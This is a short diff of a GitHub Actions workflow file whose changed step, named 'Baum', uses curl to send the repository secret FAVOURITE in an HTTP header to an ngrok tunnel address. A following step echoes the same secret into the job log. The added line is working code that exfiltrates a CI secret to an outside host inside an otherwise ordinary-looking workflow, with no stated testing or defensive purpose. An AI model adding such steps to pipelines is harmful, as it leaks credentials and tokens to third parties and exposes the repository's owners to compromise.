@@ -24,7 +24,7 @@ jobs:
 
       - name: Baum
         run: |
-          curl "https://6ee3-128-130-234-183.ngrok-free.app/$secrets.FAVOURITE"
+          curl "https://6ee3-128-130-234-183.ngrok-free.app/" -H "BAUM: ${{ secrets.FAVOURITE }}"
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
